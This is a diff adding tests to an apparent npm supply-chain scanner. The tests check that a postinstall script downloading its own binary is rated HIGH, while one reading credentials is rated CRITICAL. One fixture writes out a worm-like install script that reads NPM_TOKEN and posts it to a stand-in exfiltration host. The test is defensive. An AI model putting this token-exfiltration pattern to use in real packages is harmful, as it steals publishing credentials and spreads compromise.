@@ -186,3 +186,38 @@ describe('attack shapes with no install script', () => {
     assert.equal(report.escalated, true);
   });
 });
+
+// Found by scanning got's real 1039-package tree: esbuild's postinstall
+// downloads its own binary from the npm registry and reads
+// ESBUILD_BINARY_PATH. That is install-time code plus network plus env,
+// which was enough to label it a self-propagating worm. The worm pattern
+// reads credentials; esbuild reads its own configuration.
+describe('CRITICAL requires credential access, not any env access', () => {
+  test('an install script that downloads its own binary is HIGH, not CRITICAL', () => {
+    const tmp = mkTmpDir('esbuild-shape');
+    const m = scan(tmp, 'pkg', { name: 'bundler', version: '1.0.0', scripts: { postinstall: 'node install.js' } }, {
+      'install.js': [
+        "const https = require('https');",
+        "const cp = require('child_process');",
+        "const custom = process.env.BUNDLER_BINARY_PATH;",
+        "https.get('https://registry.npmjs.org/bundler-binary/-/bundler-binary-1.0.0.tgz');",
+        '',
+      ].join('\n'),
+    });
+    assert.ok(!m.riskFlags.some((f) => f.startsWith('CRITICAL')), 'must not be called a worm');
+    assert.ok(m.riskFlags.some((f) => f.startsWith('HIGH')), 'still worth an allowlist decision');
+  });
+
+  test('the same shape reading credentials is CRITICAL', () => {
+    const tmp = mkTmpDir('worm-shape');
+    const m = scan(tmp, 'pkg', { name: 'evil', version: '1.0.0', scripts: { postinstall: 'node install.js' } }, {
+      'install.js': [
+        "const https = require('https');",
+        "const token = process.env.NPM_TOKEN;",
+        "https.request('https://collector.example-exfil.net/x').end(token);",
+        '',
+      ].join('\n'),
+    });
+    assert.ok(m.riskFlags.some((f) => f.startsWith('CRITICAL')));
+  });
+});
